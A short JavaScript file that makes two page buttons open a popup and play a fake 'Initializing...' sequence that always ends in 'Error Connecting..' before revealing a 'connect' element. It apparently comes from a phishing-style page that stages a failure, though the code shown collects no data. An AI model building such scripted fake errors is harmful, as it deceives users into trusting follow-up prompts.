
let click_me_btn = document.querySelector("#w-node-_99744ab0-f07b-d684-90f5-8e7fccec6d3f-3a1ba278")
let click_me_btn2 = document.querySelector("body > div.new-navbar.w-nav > div.new-nav-container > nav > div > div.button-wrapper.new-nav > a")


let first_popup = document.querySelector("body > div.sc-bdVaJa.LPcxt")


click_me_btn.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
}
click_me_btn2.onclick = function (e) {
    e.preventDefault();
    loadings()
    first_popup.style.display = "flex"
}



function loadings() {
    var a =  setTimeout(function () {
        loading.innerHTML = "Initializing.";
      }, 1)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing..";
      }, 500)
    
      var a = setTimeout(function() {
        loading.innerHTML = "Initializing...";
      }, 1000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing....";
      }, 2000)

      var a = setTimeout(function() {
        loading.innerHTML = "Initializing.....";
      }, 3000)

      var a = setTimeout(function() {
        loading.innerHTML = "Error Connecting.."
        connect.style.display = "flex"
      }, 4000)
     
    }
    